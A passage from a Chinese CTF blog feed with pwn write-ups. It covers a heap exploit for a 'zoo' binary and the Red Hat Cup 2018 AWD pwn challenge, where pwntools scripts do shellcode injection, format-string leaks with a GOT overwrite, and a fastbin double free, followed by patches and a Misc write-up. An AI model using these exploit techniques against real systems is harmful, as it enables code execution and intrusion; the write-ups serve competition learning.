class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'DEBUG'</span>) </span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line">p = process(<span class="string">'./zoo'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_dog</span><span class="params">(name,weight)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(weight))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_ani</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"5"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">listen</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x40193E\nc\n")</span></span><br><span class="line">nameofzoo = <span class="number">0x605420</span></span><br><span class="line">p.sendlineafter(<span class="string">":"</span>, sc + p64(nameofzoo))</span><br><span class="line">add_dog(<span class="string">"a"</span>*<span class="number">8</span>,<span class="number">0</span>)</span><br><span class="line">add_dog(<span class="string">"b"</span>*<span class="number">8</span>,<span class="number">1</span>)</span><br><span class="line">remove_ani(<span class="number">0</span>)</span><br><span class="line">fake_vptr = nameofzoo + len(sc)</span><br><span class="line">add_dog(<span class="string">"c"</span>*<span class="number">72</span> + p64(fake_vptr),<span class="number">2</span>)</span><br><span class="line">listen(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Outline&quot;&gt;&lt;a href=&quot;#Outline&quot; class=&quot;headerlink&quot; title=&quot;Outline&quot;&gt;&lt;/a&gt;Outline&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Basic Knowledge&lt;ul&gt;
&lt;li&gt;Introduction&lt;ul&gt;
&lt;li
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>红帽杯2018线下赛AWD PWN(更新格式化字符利用)</title>
    <link href="https://4f-kira.github.io/2018/06/01/redhat2018-awd-pwn/"/>
    <id>https://4f-kira.github.io/2018/06/01/redhat2018-awd-pwn/</id>
    <published>2018-06-01T03:20:07.000Z</published>
    <updated>2018-06-05T05:29:07.641Z</updated>
    
    <content type="html"><![CDATA[<p>今年红帽杯给web题恶心到了，刚备份的代码已经有某国企的3个不死马，不知道如何做到这么快的，题目质量也堪忧，跟去年的没法比。比赛过程花太多时间在web，都没好好看看pwn，其实很简单，血亏T_T….</p><h3 id="保护情况"><a href="#保护情况" class="headerlink" title="保护情况"></a>保护情况</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  sub_CC2();                                    <span class="comment">// 初始化</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[HFS V0.0.1]"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt;"</span>, a2);</span><br><span class="line">    a2 = (<span class="keyword">char</span> **)(&amp;dword_30 + <span class="number">2</span>);</span><br><span class="line">    get_str(s2, <span class="number">50</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      a2 = (<span class="keyword">char</span> **)s2;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)qword_202100[i], s2) ) <span class="comment">//下断点</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">        ls();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        touch();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"bye!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        rm();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        su();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        sh();                                   </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(s2, a2);                         <span class="comment">// 格式化字符</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" :command not found!"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看样子是一个自己实现的shell，至于有哪些命令，可以下个断点去看看，发现只有<code>ls touch rm su sh exit</code>6个命令。</p><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>程序本来是开启了NX，不过留意一下初始化的函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">    qword_202100[i] = (__int64)<span class="built_in">malloc</span>(<span class="number">0x14</span>uLL);</span><br><span class="line">  v0 = qword_202100[<span class="number">0</span>];</span><br><span class="line">  *(_WORD *)qword_202100[0] = 'sl';</span><br><span class="line">  *(_BYTE *)(v0 + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  v1 = qword_202108;</span><br><span class="line">  *(_DWORD *)qword_202108 = 'cuot';</span><br><span class="line">  *(_WORD *)(v1 + <span class="number">4</span>) = <span class="number">104</span>;</span><br><span class="line">  v2 = qword_202110;</span><br><span class="line">  *(_DWORD *)qword_202110 = 'tixe';</span><br><span class="line">  *(_BYTE *)(v2 + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">  v3 = qword_202118;</span><br><span class="line">  *(_WORD *)qword_202118 = 'mr';</span><br><span class="line">  *(_BYTE *)(v3 + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  v4 = qword_202120;</span><br><span class="line">  *(_WORD *)qword_202120 = 'us';</span><br><span class="line">  *(_BYTE *)(v4 + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  v5 = qword_202128;</span><br><span class="line">  *(_WORD *)qword_202128 = 'hs';</span><br><span class="line">  *(_BYTE *)(v5 + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  v6 = time(<span class="number">0L</span>L);</span><br><span class="line">  srand(v6);</span><br><span class="line">  v7 = rand();</span><br><span class="line">  src = (<span class="keyword">char</span> *)mmap(</span><br><span class="line">                  (<span class="keyword">void</span> *)(((v7 + <span class="number">16</span>) &lt;&lt; <span class="number">12</span>) + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v7 + <span class="number">16</span>) &lt;&lt; <span class="number">12</span>) &gt;= <span class="number">0xFFFFFFFF</span>)),</span><br><span class="line">                  <span class="number">0x1000</span>uLL,</span><br><span class="line">                  <span class="number">7</span>,</span><br><span class="line">                  <span class="number">50</span>,</span><br><span class="line">                  <span class="number">-1</span>,</span><br><span class="line">                  <span class="number">0L</span>L);</span><br><span class="line">  v8 = src;</span><br><span class="line">  *(_QWORD *)src = '$4�\x01\v eh';</span><br><span class="line">  *((_QWORD *)v8 + 1) = 'no�H\x01\x01\x01\x01';</span><br><span class="line">  *((_QWORD *)v8 + 2) = 'HPeineD ';</span><br><span class="line">  *((_QWORD *)v8 + 3) = 'ssimreP�';</span><br><span class="line">  *((_QWORD *)v8 + 4) = '_\x01jX\x01jPi';</span><br><span class="line">  *((_QWORD *)v8 + 5) = '\x05\x0F��HZ\x13j';</span><br><span class="line">  *((_WORD *)v8 + 24) = '��';</span><br><span class="line">  v8[<span class="number">50</span>] = <span class="number">0</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br></pre></td></tr></table></figure></p><p>可以留意到程序初始化了几个命令，并且将src的内存段mmap了，那么src可以执行shellcode。然后转到<code>su()</code>看看<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">dest = s2;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x7D0</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input verify code:"</span>, <span class="number">0L</span>L);</span><br><span class="line">  get_str(src, <span class="number">2018</span>); </span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1999</span> &amp;&amp; src[i]; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !(src[i] &amp; <span class="number">1</span>) &amp;&amp; src[i] != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src); </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"check passed,enjoy!"</span>);</span><br></pre></td></tr></table></figure></p><p>这里可以对<code>src</code>进行写入，直接写shellcode好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo1</span><span class="params">()</span>:</span></span><br><span class="line">    shellcode = asm(shellcraft.sh())</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,<span class="string">'su'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'code:'</span>,shellcode)</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,<span class="string">'sh'</span>)</span><br><span class="line">    p.sendline(<span class="string">'cat /flag'</span>)</span><br></pre></td></tr></table></figure><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>输错命令就可以直接触发漏洞，这里可以用来泄露程序基址，libc基址和stack地址<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_elf</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt;&gt;"</span>,<span class="string">"%8$p"</span>)</span><br><span class="line">    init_addr = int(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    init_offset = <span class="number">0x56427404f3c0</span> - <span class="number">0x56427404e000</span></span><br><span class="line">    elf.base = init_addr - init_offset</span><br><span class="line">    success(<span class="string">'elf.base:%s'</span> %hex(elf.base))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt;&gt;"</span>,<span class="string">"%9$p"</span>)</span><br><span class="line">    libc_start_main_addr = int(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    libc_start_main_offset = libc.symbols[<span class="string">"__libc_start_main"</span>]</span><br><span class="line">    libc.base = libc_start_main_addr - libc_start_main_offset - <span class="number">0xf0</span></span><br><span class="line">    success(<span class="string">'libc.base:%s'</span> %hex(libc.base))</span><br></pre></td></tr></table></figure></p><p>由于字符串存在bss段，利用方法比较麻烦，思路是利用stack上的地址进行跳转，修改printf@got.plt<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">leak_elf()</span><br><span class="line">leak_libc()</span><br><span class="line">rbp_addr = leak_stack() - <span class="number">0xe8</span> </span><br><span class="line">success(<span class="string">'rbp_addr:%s'</span> %hex(rbp_addr))</span><br><span class="line"><span class="comment">#step1:overwrite stack to stack  # printf@got.plt 0x202048</span></span><br><span class="line">payload = hn((rbp_addr+<span class="number">0x28</span>) &amp; <span class="number">0xffff</span>,(<span class="number">6</span>+<span class="number">0x5</span>))  <span class="comment"># 0x7ffe2168cb48 -&gt; 0x7ffe2168ca88</span></span><br><span class="line">payload += hn(<span class="number">2</span>,<span class="number">6</span>+<span class="number">0x13</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,payload+<span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment">#step2:overwrite stack to printf@got.plt</span></span><br><span class="line">payload = hhn((elf.got[<span class="string">'printf'</span>] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),<span class="number">6</span>+<span class="number">0x21</span>)</span><br><span class="line">payload += hn((elf.got[<span class="string">'printf'</span>] &amp; <span class="number">0xffff</span>)-(elf.got[<span class="string">'printf'</span>] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),<span class="number">6</span>+<span class="number">0x1f</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,payload+<span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment">#step3:overwrite stack to stack</span></span><br><span class="line">payload = hn((rbp_addr+<span class="number">0x40</span>) &amp; <span class="number">0xffff</span>,(<span class="number">6</span>+<span class="number">0x5</span>)) </span><br><span class="line">payload += hn(<span class="number">2</span>,<span class="number">6</span>+<span class="number">0x13</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,payload+<span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment">#step4:overwrite stack to printf@got.plt+2</span></span><br><span class="line">payload = hhn((elf.got[<span class="string">'printf'</span>]+<span class="number">2</span> &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),<span class="number">6</span>+<span class="number">0x21</span>)</span><br><span class="line">payload += hn((elf.got[<span class="string">'printf'</span>]+<span class="number">2</span> &amp; <span class="number">0xffff</span>)-(elf.got[<span class="string">'printf'</span>]+<span class="number">2</span> &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),<span class="number">6</span>+<span class="number">0x1f</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,payload+<span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment">#step5:overwrite printf@got.plt to system@plt</span></span><br><span class="line">payload = hhn((libc.symbols[<span class="string">'system'</span>] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),<span class="number">6</span>+<span class="number">0xa</span>)</span><br><span class="line">payload += hn((libc.symbols[<span class="string">'system'</span>] &amp; <span class="number">0xffff</span>)-(libc.symbols[<span class="string">'system'</span>] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),<span class="number">6</span>+<span class="number">0x7</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,payload+<span class="string">'\x00'</span>)</span><br></pre></td></tr></table></figure></p><h3 id="fastbin-attach"><a href="#fastbin-attach" class="headerlink" title="fastbin attach"></a>fastbin attach</h3><p>malloc的大小可控，可以用fastbin dup来修改free@got.plt</p><p>由于固定输入读取长度是90，可以直接溢出。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">touch</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt;"</span>,<span class="string">"touch"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Size:"</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">"content:"</span>,content)</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ls</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt;"</span>,<span class="string">"ls"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt;"</span>,<span class="string">"rm"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo2</span><span class="params">()</span>:</span></span><br><span class="line">leak_elf()</span><br><span class="line">leak_libc()</span><br><span class="line">touch(<span class="number">0x10</span>,<span class="string">'0'</span>) <span class="comment">#0</span></span><br><span class="line">touch(<span class="number">0x10</span>,<span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">touch(<span class="number">0x10</span>,<span class="string">'cat /flag\x00'</span>)</span><br><span class="line">rm(<span class="number">0</span>)</span><br><span class="line">rm(<span class="number">1</span>)</span><br><span class="line">rm(<span class="number">0</span>)</span><br><span class="line">fake = elf.address + <span class="number">0x202018</span> - <span class="number">0x1e</span></span><br><span class="line">touch(<span class="number">0x10</span>,p64(fake))</span><br><span class="line">touch(<span class="number">0x10</span>,<span class="string">'2'</span>)</span><br><span class="line">touch(<span class="number">0x10</span>,<span class="string">'3'</span>)</span><br><span class="line">touch(<span class="number">0x10</span>,<span class="string">'\x00'</span>*<span class="number">0xe</span>+p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">rm(<span class="number">2</span>)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure></p><h3 id="patch方法"><a href="#patch方法" class="headerlink" title="patch方法"></a>patch方法</h3><h4 id="shellcode："><a href="#shellcode：" class="headerlink" title="shellcode："></a>shellcode：</h4><p>直接修改shellcode的输入长度<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input verify code:"</span>, <span class="number">0L</span>L);</span><br><span class="line">get_str(src, <span class="number">16</span>);</span><br></pre></td></tr></table></figure></p><h4 id="double-free："><a href="#double-free：" class="headerlink" title="double free："></a>double free：</h4><p>修改检查标识位校验，防止double free<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">9</span> &amp;&amp; *(_QWORD *)&amp;used_tag[<span class="number">2</span> * v1] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)file_list[v1]);</span><br><span class="line">  used_tag[v1] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><h4 id="格式化字符串："><a href="#格式化字符串：" class="headerlink" title="格式化字符串："></a>格式化字符串：</h4><p><code>printf</code> 改 <code>puts</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(s2);                              </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" :command not found!"</span>, a2);</span><br></pre></td></tr></table></figure></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>不知道还有没有其他的利用方法，有大佬知道的麻烦告知。最后说一句，垃圾比赛~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今年红帽杯给web题恶心到了，刚备份的代码已经有某国企的3个不死马，不知道如何做到这么快的，题目质量也堪忧，跟去年的没法比。比赛过程花太多时间在web，都没好好看看pwn，其实很简单，血亏T_T….&lt;/p&gt;
&lt;h3 id=&quot;保护情况&quot;&gt;&lt;a href=&quot;#保护情况&quot; cla
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>广东红帽杯2018 writeup</title>
    <link href="https://4f-kira.github.io/2018/05/02/redhat2018/"/>
    <id>https://4f-kira.github.io/2018/05/02/redhat2018/</id>
    <published>2018-05-02T01:32:21.000Z</published>
    <updated>2018-05-02T01:36:18.992Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Not-Only-Wireshark（solved）"><a href="#Not-Only-Wireshark（solved）" class="headerlink" title="Not Only Wireshark（solved）"></a>Not Only Wireshark（solved）</h3><p><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/NotOnlyWireshark_ed63b63425ec3ed09470d8715b208293.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/NotOnlyWireshark_ed63b63425ec3ed09470d8715b208293.zip?pass=null</a><br><strong>hint: tshark</strong><br>打开流量包，直接查看http数据，发现存在很多name=xxx的访问记录，将所有16进制提取出来。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> strings 123.pcapng| grep name| grep -oP <span class="string">"name=[0-9A-F]+"</span>| tr -d <span class="string">'name='</span>|tr -d <span class="string">'\n'</span> &gt; flag</span></span><br></pre></td></tr></table></figure></p><p>修复zip文件头</p><p>密码是：<code>?id=1128%23</code><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> strings 123.pcapng| grep key</span></span><br><span class="line">&amp;GET /xss/example4.php?key=?id=1128%23 HTTP/1.1</span><br><span class="line">Referer: http://10.211.55.15/xss/example4.php?key=?id=1128%23</span><br></pre></td></tr></table></figure></p><h3 id="这是道web题？（solved）"><a href="#这是道web题？（solved）" class="headerlink" title="这是道web题？（solved）"></a>这是道web题？（solved）</h3><p><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/yunCMS_256035f22b73fdb1c90fd7503c4005ed.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/yunCMS_256035f22b73fdb1c90fd7503c4005ed.zip?pass=null</a><br>直接用D盾扫一下，发现一个jsp大马和一个变形php一句话</p><p>打开jsp大马看到<code>&lt;Bad way. Get OUT. No000000000flag&gt;</code>，估计不在这里</p><p>然后打开变形php一句话，发现下面有提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">You eventually found me</span><br><span class="line">I am a hacker from Georgia</span><br><span class="line">You are doing too much food at your upload</span><br><span class="line">Used tshark to make traffic records?</span><br><span class="line">Then you go to the traffic to find me</span><br></pre></td></tr></table></figure></p><p>打开同目录下的流量包<code>78466550-3fc1-11e8-9828-32001505e920.pcapng</code>，找到访问<code>companytplfiles.php</code>的流量，发现里面有一个jpg和gif，flag就在gif里面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print &apos;&apos;.join([chr(x) for x in [102,108,97,103,123,83,48,50,50,121,52,111,114,114,53,125]])</span><br><span class="line">flag&#123;S022y4orr5&#125;</span><br></pre></td></tr></table></figure></p><h3 id="听说你们喜欢手工爆破（solved）"><a href="#听说你们喜欢手工爆破（solved）" class="headerlink" 